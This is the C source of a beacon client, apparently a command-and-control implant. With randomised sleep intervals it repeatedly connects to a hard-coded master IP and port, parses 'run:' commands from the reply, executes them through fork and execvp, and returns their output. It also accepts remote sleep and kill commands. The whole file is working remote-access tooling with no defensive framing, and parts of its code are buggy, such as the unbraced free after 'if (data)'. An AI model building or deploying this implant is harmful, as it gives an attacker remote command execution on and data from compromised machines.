#include <stdlib.h>
#include <stdio.h>
#include "beacon_client.h"

int main(int argc, char **argv){
    struct sockaddr_in master;
    char *data = NULL;
    #ifdef CLIENT_DEBUG
    int set_sleep = 3;
    #else
    int set_sleep = SLEEP_BASE;
    #endif
    master_init(&master);
    while ( 1 ) {
        #ifdef CLIENT_DEBUG
            int sleep_time = (rand() % (int)(set_sleep*0.15+1)) + set_sleep;
            printf("Sleeping for %d seconds... ", sleep_time);
        #else
            int sleep_time = (rand() % (int)(set_sleep*0.15+1)) + set_sleep;
        #endif

        #if defined(__apple__) || defined(__linux__) || defined(__unix__)
        sleep(sleep_time); //seconds
        #elif __windows__
        Sleep(sleep_time*1000); //seconds -> milliseconds
        #endif

        #ifdef CLIENT_DEBUG
        printf("Complete.\n");
        #endif

        char *resp = master_checkin(master, data);
        if (data)
            bzero(data, strlen(data)+1);
            free(data);
        data = NULL;
        if (!strncmp(resp, "run:", 4)) {
            uint32_t resplen = strlen(resp);
            uint32_t cmdlen = resplen-4;
            if (cmdlen) {
                char *cmd = (char *)malloc(sizeof(char) * (cmdlen+1));
                strncpy(cmd,resp+4,cmdlen);
                int len;
                char ** args = tokenize_cmd(cmd,&len);
                //char ** args = parse(cmd);
                printf("Arguments:\n");
                for (int i = 0; i < len; i++){
                    printf("\tArg[%d] = %s\n",i,args[i]);
                }
                if (args[len] == 0){
                    printf("\tArg[%d] = '\\0'\n",len);
                } else {
                    printf("\tArg[%d] is not NULL! %s\n",len,args[len]);
                }
                data = run_cmd(args);
                //for (int i = 0; i <= len; i++){
                //    free(args[i]);
                //}
                //free(args);
                //char *found;
                //if ((found = strchr(cmd,' '))) {
                //    #ifdef CLIENT_DEBUG
                //        printf("cmd=%u\n",(uint32_t)cmd);
                //        printf("found=%u\n",(uint32_t)found);
                //    #endif
                //    uint32_t loc = (uint32_t)((found)-cmd+1);
                //    #ifdef CLIENT_DEBUG
                //        printf("loc=%u\n",loc);
                //    #endif
                //    uint32_t arglen = (cmdlen-loc);
                //    #ifdef CLIENT_DEBUG
                //        printf("arglen=%u\n",arglen);
                //    #endif
                //    char *args = (char *)malloc(sizeof(char) * (arglen+1));
                //    strncpy(args,found+1,arglen);
                //    cmd[loc-1] = '\0';
                //    args[arglen] = '\0';
                //    data = run_cmd(cmd,args);
                //    free(args);
                //} else {
                //    cmd[cmdlen] = '\0';
                //    #ifdef CLIENT_DEBUG
                //        printf("cmd=%u val:%s\n",(uint32_t)cmd,cmd);
                //    #endif
                //   data = run_cmd(cmd,NULL);
                //}
                free(cmd);
            }
        }
        if (!strncmp(resp, "get os", 7)){
            data = (char*)malloc(strlen("set os:") + strlen(OS)+1);
            sprintf(data, "%s%s", "set os:", OS);
        }
        if (!strncmp(resp, "set sleep:", 10)){
            sscanf((resp+10), "%d", &set_sleep);
            data = (char*)malloc(strlen("SET SLEEP OK")+1);
            strcpy(data, "SET SLEEP OK");
        }
        if (!strncmp(resp, "get sleep", 9)){
            data = (char*)malloc(strlen("set sleep:")+snprintf(NULL, 0, "%d", set_sleep)+1);
            sprintf(data, "set sleep:%d", set_sleep);
        }
        if (!strncmp(resp, "killkillkill", 9)){
            data = (char*)malloc(strlen("i am kill")+1);
            strcpy(data, "i am kill");
        }
        free(resp);
    }
    return 0;
}

char** parse(char *string)
{
    char** ret = malloc(sizeof(char*));
    ret[0] = strtok(string, " \n");
    int i = 0;
    for (; ret[i]; ret[i] = strtok(NULL, " \n"))
    {
        ret = realloc(ret, sizeof(char*) * ++i);
    }

    return ret;
}

char **tokenize_cmd(char *cmd, int *count){
    uint32_t cmdlen = strlen(cmd);
    char **tokens = (char **)malloc(sizeof(char *) * (cmdlen));
    
    int is_quote = 0;
    int is_dquote = 0;
    uint32_t start = 0;
    uint32_t index = 0;
    for (uint32_t end = 0; end <= cmdlen; end++){
        if (!is_dquote && !is_quote && (cmd[end] == ' ' || cmd[end] == 0)){
            if (end > start) {
                uint32_t toklen = (end - start);
                tokens[index] = (char *)malloc(sizeof(char) * ((toklen)+1));
                strncpy(tokens[index],cmd+start,toklen);
                tokens[index][toklen] = '\0';
                start = end+1;
                index++;
            }
        }
        if (cmd[end] == '"' || (is_quote && cmd[end] == 0)){
            if (is_quote){
                //end quote
                if (end > start) {
                    uint32_t toklen = (end - start)+1;
                    tokens[index] = (char *)malloc(sizeof(char) * ((toklen)+1));
                    strncpy(tokens[index],cmd+start,toklen);
                    tokens[index][toklen] = '\0';
                    start = end+2;
                    index++;
                    is_quote = 0;
                }
            } else if (!is_dquote) {
                is_quote = 1;
            }
        }
        if (cmd[end] == '\'' || (is_dquote && cmd[end] == 0)){
            if (is_dquote){
                //end quote
                if (end > start) {
                    uint32_t toklen = (end - start)+1;
                    tokens[index] = (char *)malloc(sizeof(char) * ((toklen)+1));
                    strncpy(tokens[index],cmd+start,toklen);
                    tokens[index][toklen] = '\0';
                    start = end+2;
                    index++;
                    is_dquote = 0;
                }
            } else if (!is_quote) {
                is_dquote = 1;
            }
        }
    }
    tokens[index] = (char *)malloc(sizeof(char));
    tokens[index] = NULL;
    #ifdef CLIENT_DEBUG
    printf("[tokenize_cmd] Arguments found: %d\n",index);
    #endif
    (*count) = index;
    return tokens;
}
/*
 * Initalize connection
 */
int master_init(struct sockaddr_in *master) {

    #if defined __apple__ || defined(__linux__) || defined(__unix__)
    memset(master, 0, sizeof(struct sockaddr_in));
    master->sin_family = AF_INET;
    master->sin_addr.s_addr = inet_addr( MASTER_IP );
    master->sin_port = htons(MASTER_PORT);
    #elif __windows__
    // TODO
    #endif
    return 0;
}

char *master_checkin(struct sockaddr_in master, char *data){
    char *server_reply = (char *)malloc(MASTER_RECV_SIZE);
    int recv_size;
    #if defined __apple__ || defined(__linux__) || defined(__unix__)
    // do standard sockets
    bzero(server_reply, MASTER_RECV_SIZE);
    int s;
    if ((s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
        #ifdef CLIENT_DEBUG
            printf("[master_checkin] Socket creation failed.\n");
        #endif
            return server_reply;
    }
    // Establish connection
    if (connect(s, (struct sockaddr *) &master, sizeof(master)) < 0) {
        #ifdef CLIENT_DEBUG
            printf("[master_checkin] Connect to master failed.\n");
        #endif
        return server_reply;
    }
    // Send data
    if(data && send(s , data , strlen(data) , 0) < 0) {
        return server_reply; //something failed :(
    }
    if (data && !strcmp(data, "i am kill")){
        free(data);
        free(server_reply);
        close(s);
        exit(0);
    }
    //Receive a reply from the server
    if((recv_size = recv(s , server_reply , MASTER_RECV_SIZE , 0)) < 0) {
        puts("recv failed");
    }
    close(s);
    #elif __windows__
    WSADATA wsa;
    SOCKET s;

    #ifdef CLIENT_DEBUG
        printf("[master_checkin] Initialising...");
    #endif
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0) {
        #ifdef CLIENT_DEBUG
            printf("Failed. Error: %d",WSAGetLastError());
        #endif
        return server_reply;
    }

    //Create a socket
    if((s = socket( AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET) {
        #ifdef CLIENT_DEBUG
        printf("Could not create socket : %d" , WSAGetLastError());
        #endif
        return server_reply;
    }

    // Connect to master
    if (connect(s , (struct sockaddr *)&master , sizeof(master)) < 0) {
        return server_reply;
    }

    // Send data
    if( send(s , data , strlen(data) , 0) == SOCKET_ERROR) {
        return server_reply;
    }
    //Receive a reply from the server
    if((recv_size = recv(s , server_reply , MASTER_RECV_SIZE , 0)) == SOCKET_ERROR) {
        puts("recv failed");
    }
    //Add a NULL terminating character to make it a proper string before printing
    #endif
    server_reply[recv_size] = '\0';
    return server_reply;
}

char *get_os() {
    int len = strlen(ID_CMD);
    char **cmd = (char **)malloc(sizeof(char *));
    cmd[0] = (char *)malloc(sizeof(char) * (len+1));
    strncpy(cmd[0],ID_CMD,len);
    char *data = run_cmd(cmd);
    free(cmd[0]);
    free(cmd);
    return data;
}

char *run_cmd(char **args) {
    int pipes[2];
    pid_t pid;
    char *buf = (char *)malloc(sizeof(char) * BUF_SIZE);
    bzero(buf, BUF_SIZE);
    if (pipe(pipes)==-1) {
        #ifdef CLIENT_DEBUG
        puts("[run_cmd] Failed to pipe.\n");
        #endif
        return NULL; // fail
    }
    if ((pid = fork()) == -1) {
        #ifdef CLIENT_DEBUG
        puts("[run_cmd] Failed to fork.\n");
        #endif
        return NULL; // fail
    }

    //char **args = (char **)malloc(sizeof(char *) * 2);
    if(pid == 0) {
        int i = 0;
        //while (args[i]){
        //    printf("Args[%d] %s\n",i,args[i]); 
        //    i++;
        //}
        // TODO: FIX from direct exec to
        // pipe->dup2->exec shell->write to stdin->send \n to stdin->read stdout save results->return results
        #if defined(__apple__) || defined(__linux__) || defined(__unix__)
            dup2(pipes[1], STDOUT_FILENO);
            dup2(pipes[1], STDERR_FILENO);
        #elif __windows__
        _dup2(pipes[1], STDOUT_FILENO);
        #endif
        close(pipes[0]);
        close(pipes[1]);
        #if defined(__apple__) || defined(__linux__) || defined(__unix__)
        if (execvp(args[0],args) < 0) {
            perror("Error: Command not found\n");
        }
        //perror("Args:\n");
        //i = 0;
        //while (args[i]){
        //    perror(args[i]); 
        //    i++;
        //}
        #elif __windows__
        //_execv(cmd,param);
        #endif
        exit(0);
    } else {
        close(pipes[1]);
        read(pipes[0], buf, BUF_SIZE);
        //wait(NULL);
        #ifdef CLIENT_DEBUG
        printf("[run_cmd] cmd ran: %s, output:%s\n",args[0],buf);
        #else
        int j = 0;
        while (args[j] != 0){
            free(args[j]);
            j++;
        }
        free(args[j]);
        free(args);
        #endif
    }
    //free(args);
    return buf;
}
